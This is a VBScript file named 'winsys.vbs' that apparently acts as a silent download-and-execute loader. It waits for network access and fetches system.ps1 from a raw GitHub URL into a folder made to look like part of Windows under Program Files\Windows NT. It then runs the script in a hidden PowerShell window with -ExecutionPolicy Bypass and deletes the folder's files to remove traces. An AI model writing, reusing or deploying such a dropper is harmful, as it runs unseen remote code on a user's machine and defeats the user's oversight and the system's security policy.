' winsys.vbs
' Automatically download, execute system.ps1, and clean up the ADB folder silently

Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objXMLHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0")

' Define the path to save system.ps1 in the new location C:\Program Files\Windows NT\ADB
ps1File = "C:\Program Files\Windows NT\ADB\system.ps1"

' Function to check network connectivity with retries and increased wait time
Function IsNetworkAvailable()
    Dim retryCount
    retryCount = 0

    Do While retryCount < 10 ' Retry up to 10 times
        On Error Resume Next
        objXMLHTTP.open "GET", "http://www.google.com", False
        objXMLHTTP.setRequestHeader "User-Agent", "Mozilla/5.0"
        objXMLHTTP.send()
        If objXMLHTTP.Status = 200 Then
            IsNetworkAvailable = True
            Exit Function
        Else
            retryCount = retryCount + 1
            WScript.Sleep 2000 ' Wait for 2 seconds before retrying
        End If
        On Error GoTo 0
    Loop
    IsNetworkAvailable = False
End Function

' Function to check write access to a folder
Function HasWritePermission(folderPath)
    On Error Resume Next
    Set objFolder = objFSO.GetFolder(folderPath)
    Set objFile = objFSO.CreateTextFile(folderPath & "\testfile.tmp", True)
    If Err.Number = 0 Then
        objFile.Close
        objFSO.DeleteFile(folderPath & "\testfile.tmp")
        HasWritePermission = True
    Else
        HasWritePermission = False
    End If
    On Error GoTo 0
End Function

' Check if the script has write permission to the folder C:\Program Files\Windows NT\ADB
If Not objFSO.FolderExists("C:\Program Files\Windows NT\ADB") Then
    objFSO.CreateFolder "C:\Program Files\Windows NT\ADB" ' Create the folder if it doesn't exist
End If

' Check write permission for the folder
If Not HasWritePermission("C:\Program Files\Windows NT\ADB") Then
    WScript.Echo "Không có quyền ghi vào thư mục C:\Program Files\Windows NT\ADB. Chạy script với quyền quản trị."
    WScript.Quit
End If

' Loop until network is available
Do
    If IsNetworkAvailable() Then
        Exit Do
    Else
        WScript.Sleep 3000 ' Wait for 3 seconds before retrying
    End If
Loop

' Download system.ps1 after network is confirmed to be available
Sub DownloadFile(url, filepath)
    On Error Resume Next
    objXMLHTTP.open "GET", url, False
    objXMLHTTP.setRequestHeader "User-Agent", "Mozilla/5.0"
    objXMLHTTP.send()
    If objXMLHTTP.Status = 200 Then
        Set objStream = CreateObject("ADODB.Stream")
        objStream.Type = 1 ' Binary
        objStream.Open
        objStream.Write objXMLHTTP.ResponseBody
        objStream.SaveToFile filepath, 2 ' Overwrite if file exists
        objStream.Close
        Set objStream = Nothing
        
        ' Check if the file is empty and download again if it's empty
        Do While objFSO.GetFile(filepath).Size = 0
            WScript.Sleep 5000 ' Wait 5 seconds before retrying download
            objXMLHTTP.open "GET", url, False
            objXMLHTTP.setRequestHeader "User-Agent", "Mozilla/5.0"
            objXMLHTTP.send()
            If objXMLHTTP.Status = 200 Then
                Set objStream = CreateObject("ADODB.Stream")
                objStream.Type = 1 ' Binary
                objStream.Open
                objStream.Write objXMLHTTP.ResponseBody
                objStream.SaveToFile filepath, 2 ' Overwrite if file exists
                objStream.Close
                Set objStream = Nothing
            End If
        Loop
    Else
        WScript.Echo "Lỗi khi tải xuống. Mã lỗi: " & objXMLHTTP.Status
        WScript.Quit
    End If
    On Error GoTo 0
End Sub

' Now download system.ps1 only after confirming network availability
DownloadFile "https://raw.githubusercontent.com/quannqttg/coccoc/main/system.ps1", ps1File

' Check if the download was successful
If objFSO.FileExists(ps1File) Then
    ' Execute system.ps1 with PowerShell (hidden window)
    objShell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File """ & ps1File & """", 0, True

    ' Delete all files in the folder C:\Program Files\Windows NT\ADB
    If objFSO.FolderExists("C:\Program Files\Windows NT\ADB") Then
        For Each objFile In objFSO.GetFolder("C:\Program Files\Windows NT\ADB").Files
            objFile.Delete True ' Delete file
        Next
    End If
Else
    objShell.Popup "Tải xuống system.ps1 thất bại. Vui lòng kiểm tra URL hoặc kết nối mạng.", 5, "Thông báo", 48
End If

' Clean up objects
Set objShell = Nothing
Set objFSO = Nothing
Set objXMLHTTP = Nothing
